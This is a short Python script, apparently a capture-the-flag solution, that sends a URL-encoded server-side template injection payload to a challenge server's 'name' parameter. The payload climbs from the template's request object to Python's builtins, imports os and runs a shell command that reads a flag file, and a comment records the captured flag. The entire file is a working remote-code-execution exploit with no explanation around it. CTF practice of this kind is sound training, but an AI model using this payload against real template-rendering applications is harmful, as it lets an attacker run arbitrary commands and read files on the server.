import requests
import urllib.parse

url = 'http://recruit.osiris.bar:32001'

payload = "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /home/ctf/flag.txt').read()}}"
encoded_payload = urllib.parse.quote(payload)

response = requests.get(f"{url}/?name={encoded_payload}")
print(response.text)

# flag{NevEr_evaL_uSEr_iNPU7!}
